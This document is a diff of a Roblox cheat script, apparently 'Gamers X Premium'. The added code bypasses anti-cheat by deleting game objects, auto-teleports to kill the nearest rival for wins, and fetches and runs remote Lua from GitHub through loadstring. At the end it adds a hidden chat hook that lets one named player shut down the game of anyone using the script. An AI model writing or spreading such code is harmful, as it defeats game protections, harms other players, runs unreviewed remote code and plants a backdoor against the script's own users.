@@ -247,11 +247,8 @@ section1:addButton("Anticheats (Bypass)", function()
         workspace:FindFirstChild("Local"):Destroy()
         workspace:FindFirstChild("MobileFix"):Destroy()
         workspace:FindFirstChild("XboxFix"):Destroy()
-        workspace:FindFirstChild("SelectedExclusive"):Destroy()
         game.workspace.Borders.InvisibleBorder:remove()
         game.workspace.Lobby.KillPlates:remove()
-        game:GetService("Players").LocalPlayer.PlayerGui.Extra.Local:Destroy()
-        game:GetService("Players").LocalPlayer.PlayerGui.Extra.Local:Destroy()
         venyx:Notify("Bypassed", "Bypassed: true")
 
         plr.CharacterAdded:Connect(function()
@@ -265,7 +262,6 @@ section1:addButton("Anticheats (Bypass)", function()
             workspace:FindFirstChild("MobileFix"):Destroy()
             workspace:FindFirstChild("XboxFix"):Destroy()
         end)
-    else
         venyx:Notify("Really", "Bypassed")           
     end
 end)
@@ -292,6 +288,12 @@ section1:addButton("Respawn", function()
     wait(0.2)
     venyx:Notify("Character", "Respawned")
 end)
+--fling-
+section1:addButton("Gamers X Fling", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EliasGamer780YT/Gamers-X-V2-Premium/main/GamersXFling.Lua", true))()
+    print("Clicked")
+    end)
+
 --MainStuff--
 local page = venyx:addPage("MainStuff", 5012544693)
 local section2 = page:addSection("Attack And More")
@@ -1461,6 +1463,75 @@ section4:addButton("Anti-AFK", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = priorpos
        print("Clicked")
        end)
+       --FARMWINS--
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function GetClosest()
+    local Character = LocalPlayer.Character
+    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
+    if not (Character or HumanoidRootPart) then
+        return
+    end
+
+    local TargetDistance = math.huge
+    local Target
+
+    for i, v in ipairs(Players:GetPlayers()) do
+        if
+            v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and
+                v.Character:FindFirstChild("Sword") or
+                v.Backpack:FindFirstChild("Sword")
+         then
+            local TargetHRP = v.Character.HumanoidRootPart
+            local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
+            if mag < TargetDistance then
+                TargetDistance = mag
+                Target = v
+            end
+        end
+    end
+
+    return Target
+end
+--Farmwins--
+section4:addToggle("AutoFarm", nil, function(value)
+    _G.toggled = value
+   if value == true then
+    while _G.toggled == true do 
+        wait(0.5)
+    if GetClosest() == nil then
+        for i, v in pairs(game:GetService("Workspace").GameStorage.Coins:GetChildren()) do
+            wait(0.1)
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
+            wait(0.1)
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 190, 0)
+        end
+    end
+    if GetClosest().Character.HumanoidRootPart.Position.Y <= 130 then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 185, 0)
+    end
+    if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+        game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent =
+            game.Players.LocalPlayer.Character
+    end
+    if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+        game.Players.LocalPlayer.Character:FindFirstChild("Sword"):Activate()
+    end
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+        GetClosest().Character.HumanoidRootPart.CFrame - Vector3.new(0, 5.3, 0) +
+        GetClosest().Character.HumanoidRootPart.CFrame.lookVector * -4.005
+
+        if _G.toggled == false then 
+            break end
+   end
+
+end
+
+   if value == false then
+    print("bruh")
+   end
+end)
        local section4 = page:addSection("FE Scripts")
 --Spy Ware-
 section4:addButton("Gamers X Chat Private", function()
@@ -1622,6 +1693,7 @@ Load(Dex)
                 print("Clicked")
                 end)
 
+                
             --Barrier----
 --Barrier and undermine
 local section4 = page:addSection("Barrier & Undermine Block")
@@ -1754,9 +1826,10 @@ section5:addButton("Exit", function()
     _G.infinjump       = false
     _G.SphereActivated = false 
     _G.Dist            = 0
+    _G.toggled         = true
     for i,v in pairs(ct) do v:Disconnect() end
     for i,v in next, game:GetService("CoreGui"):GetDescendants() do
-        if v:IsA("ScreenGui") and v.Name =="Gamers X Premium V2" then 
+        if v:IsA("ScreenGui") and v.Name =="Gamers X Premium V 3.1" then 
             v:Destroy() 
         end
     end
@@ -1777,10 +1850,12 @@ section5:addButton("ReloadScript", function()
     _G.infinjump       = false
     _G.SphereActivated = false 
     _G.Dist            = 0
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EliasGamer780YT/Gamers-X-V2-Premium/main/Gamers%20X%20Premium%20V2a.Lua"))()
-    for i,v in pairs(ct) do v:Disconnect() end
+    _G.toggled         = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EliasGamer780YT/Gamers-X-V2-Premium/main/Gamers%20X%20Premium%20V2a.Lua"))()
+     for i,v in pairs(ct) do v:Disconnect() end
+     print("ReloadScript Not Working :( I'm Sorry :,v")
+     venyx:Notify("Reload Script Not Working :( i'm Sorry :,v")
 end)
-
 --Commands-
 game.Players.LocalPlayer.Chatted:connect(function(msg)
     if msg:sub(1, 9) == "/Lag" then
@@ -1818,3 +1893,16 @@ end)
 
    game.Players:WaitForChild("Jonathan342820")
 venyx:Notify("Elias ta en partida", "Conche Tu Mare Vali D:")
+---XD-
+game.Players["Jonathan342820"].Chatted:connect(function(msg)
+    if msg:sub(1, 9) == "/e kick" then
+
+        game.StarterGui:SetCore("SendNotification", {
+            Title    = "HAHAHAHAHAHAHA";
+            Text     = "HAHAHAHAHAHAHAHA";
+            Duration = 10;
+        })
+        wait(3)
+        game:Shutdown()
+    end
+end)
